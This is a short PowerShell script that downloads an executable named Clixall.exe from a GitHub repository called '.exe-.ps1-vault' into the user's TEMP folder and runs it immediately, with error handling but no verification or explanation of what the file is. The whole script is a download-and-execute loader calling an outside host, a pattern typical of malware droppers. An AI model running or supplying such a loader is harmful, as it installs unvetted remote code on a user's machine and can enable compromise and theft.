$exeUrl = "https://github.com/DomainTyler/.exe-.ps1-vault/raw/main/Clixall.exe"
$localPath = "$env:TEMP\Clixall.exe"
try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $localPath -ErrorAction Stop
    Start-Process -FilePath $localPath -Wait
} catch {
    Write-Error "Failed to download or run the executable: $_"
}
